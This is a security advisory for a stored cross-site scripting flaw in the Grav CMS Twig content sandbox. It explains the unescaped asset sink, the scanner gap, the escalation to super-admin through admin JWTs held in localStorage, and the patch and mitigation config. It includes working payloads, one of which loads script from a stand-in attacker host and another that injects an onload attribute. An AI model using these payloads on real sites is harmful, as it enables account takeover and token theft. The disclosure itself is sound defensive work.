# [M] Grav: Page editors can inject arbitrary script into rendered pages via the Twig sandbox's assets.addJs/addCss allowlist, escalating to super-admin

## Summary
Severity: Medium
Advisory: GHSA-8hgv-xc77-jmcr
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N (CVSS_V4)
Published: 2026-08-21
Source: https://github.com/advisories/GHSA-8hgv-xc77-jmcr
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.20

## Details
## Summary

Grav 2.0 renders editor-authored Twig in page content by default and relies on the Twig content sandbox to contain it. The shipped sandbox policy allowlists `addcss` and `addjs` on `Grav\Common\Assets` (`system/src/Grav/Common/Twig/Sandbox/SandboxDefaults.php:307`). Because the sandbox arbitrates the *call* and not its downstream effect, a user holding only page-edit rights can register an arbitrary asset from page content; the theme then emits it into the document head as a `<script src>` / `<link href>` tag. The asset URL is concatenated into that tag **without escaping**, so it can also break out of its own attribute.

The save-time XSS scan cannot see this: `Security::detectXssInEditorContent()` renders the content body in isolation and inspects the returned string, while `assets.addJs()` acts by mutating the shared Assets service and returns only an object key. The payload contains no markup for the scanner to flag.

This is not a `Security::detectXss()` bypass. It is content reaching an unescaped output sink through an allowlisted method.

## Affected versions

All Grav 2.0 releases whose sandbox policy allowlists `addcss`/`addjs` on `Grav\Common\Assets`. The entry predates 2.0.19 — it was carried forward unchanged when the sandbox allowlists moved from `system/config/security.yaml` into `SandboxDefaults` in 2.0.19.

Grav 1.7 is not affected: it has no Twig content sandbox and required an explicit per-page `process: twig`.

## Details

**Reachable by a plain page editor, with no Twig permission and no configuration change.** On a stock install `security.twig_content.process_enabled` is `true` and `system/config/system.yaml` ships `process: { markdown: true }` with no `twig` key, so `Security::applyTwigContentDefault()` defaults every page's `process.twig` to the gate's value. Content Twig therefore runs on every page that does not explicitly set the flag. `security.twig_content.editor_enabled: false` and the `admin.pages_twig` permission gate only the per-page *override checkbox* in the editor — they do not gate whether Twig runs.

**The sink.** `Assets/Js.php:46` (and identically `Css.php:50`, `Link.php:41`, `JsModule.php:47`) builds the tag by concatenation with no escaping:

```php
return '<script src="' . trim($this->asset) . $this->renderQueryString() . '"' . $this->renderAttributes() . ...
```

For any remote asset, `BaseAsset::init()` stores the caller's string verbatim. Two working variants follow:

1. External script inclusion — `{{ assets.addJs('https://attacker.example/poc.js') }}`
2. Attribute injection with **no attacker-controlled host** — `{{ assets.addJs('/user/themes/quark/js/site.js', {'onload':'alert(1)'}) }}`, because `unifyLegacyArguments()` passes a second array argument straight into the tag's attributes and attribute *names* are not filtered. The same effect is reachable by embedding a quote in the URL itself.

**Timing.** `Twig::processSite()` resolves `$page->content()` before rendering the theme template, so the registration lands before the head is emitted.

`javascript:` and `data:` URLs are not exploitable — they are treated as local paths and dropped when the file does not exist.

## Impact

Persistent script execution on the site's own origin for every visitor of the affected page — **including administrators**, which makes this a page-editor-to-super-admin escalation:

- Admin-Next renders the page-edit preview as an iframe pointed at the real front-end URL with `sandbox="allow-same-origin allow-scripts allow-forms"`, so simply previewing the editor's page executes the payload on the admin panel's origin. The existing preview session isolation (`plugins.api.protect_frontend_session`) only suppresses server-side session start to protect a visitor's front-end session; it does not isolate the origin and does not prevent this.
- Admin-Next persists the administrator's API **access and refresh JWTs** in `localStorage` on that same origin. Injected script reads them directly, yielding portable super-admin API access that outlives the page view.
- An administrator merely browsing the public site while logged in is equally sufficient; the preview is not required.

## Patches

Fixed in Grav 2.0.20:

- `addcss`/`addjs` removed from the `Grav\Common\Assets` sandbox method allowlist. Asset registration is a layout concern, not a content concern. Sites that genuinely need it can re-add the methods through `security.twig_sandbox.allowed_methods`, which is additive over the shipped defaults.
- Asset URLs are now HTML-escaped at every render site (`Js`, `Css`, `Link`, `JsModule`, and the pipeline), so a quote in an asset URL can no longer break out of its attribute regardless of which caller supplied it.

Operators who cannot upgrade immediately can tighten the policy in `user/config/security.yaml`:

```yaml
twig_sandbox:
  denied_methods:
    - class: Grav\Common\Assets
      methods: 'addcss, addjs'
```

## Credits

Reported by Ahmed Ibrahim (@skeletonsec).

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-8hgv-xc77-jmcr
- https://github.com/getgrav/grav/commit/a4e8c4b748eb338ee7ab1dd26e7620a93bade047
- https://github.com/getgrav/grav
- https://github.com/getgrav/grav/releases/tag/2.0.20
